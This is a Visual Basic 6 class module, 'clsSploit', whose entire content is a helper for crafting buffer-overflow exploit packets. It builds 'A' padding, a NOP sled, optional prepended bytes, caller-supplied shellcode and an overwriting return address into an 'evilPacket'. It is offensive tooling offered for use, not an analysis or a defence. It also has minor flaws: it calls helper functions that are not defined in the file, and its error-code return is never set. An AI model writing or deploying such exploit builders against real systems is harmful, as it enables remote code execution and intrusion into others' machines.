VERSION 1.0 CLASS
BEGIN
  MultiUse = -1  'True
  Persistable = 0  'NotPersistable
  DataBindingBehavior = 0  'vbNone
  DataSourceBehavior  = 0  'vbNone
  MTSTransactionMode  = 0  'NotAnMTSObject
END
Attribute VB_Name = "clsSploit"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = True
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Public retOffset As String      ' return offset in hex
Public shellcode As String      ' shellcode in hex
Public evilPacket As String     ' our final packet is stored here
Public bufferLen As Integer     ' the length we have to work with
Public prepend As Boolean       ' do we have any data to prepend?
Public prependBytes As String   ' What data are we prepending?
Public useNops As Boolean       ' do we want to use nops to slide into shellcode?
Public nopCount As Integer      ' how many nops before shellcode?

'Anything below here is just for flavor.
Public expName As String
Public CVEID As String
Public OSINFO As String




Private Sub Class_Initialize()

    'Debug.Print "New exploit initialized!"
    
End Sub


Private Function makePadding(count As Integer) As String
    'creates some padding for us
    Dim myPad As String

    
    For I = 1 To count
        myPad = myPad & "A"
    Next I
    
    makePadding = myPad
    
End Function

Public Function craftSploitCode() As Integer 'returns error code
    Dim myPacket As String
    Dim junk As String
    
    retOffset = HexToStr(retOffset)
    
    If useNops = True Then
        junk = makePadding(bufferLen - Len(shellcode) - nopCount)
        myPacket = junk & makeNops(nopCount)
    Else
        junk = makePadding(bufferLen - Len(shellcode))
        myPacket = junk
    End If
    
    
    If prepend = True Then
        myPacket = myPacket & HexToStr(prependBytes)
    End If
    
    myPacket = myPacket & shellcode
    
    myPacket = myPacket & retOffset
     
    'MsgBox StringToHex(myPacket)
    
    evilPacket = myPacket
    
End Function

Private Function willShellcodeFit() As Boolean

    'returns true if we have enough space for our shellcode
    If Len(shellcode) <= bufferLen Then
        willShellcodeFit = True
    Else
        willShellcodeFit = False
    End If
    
End Function

Private Function countPadding() As Integer

    'returns the total number of nops and padding characters we're going to need.
    countPadding = bufferLen - Len(shellcode) - Len(prependBytes)
    
End Function

Private Function makeNops(count As Integer) As String

    'creates some nops for us
    Dim myNops As String
    
    For I = 1 To count
        myNops = myNops & HexToString(90)
    Next I
    
    makeNops = myNops
    
End Function
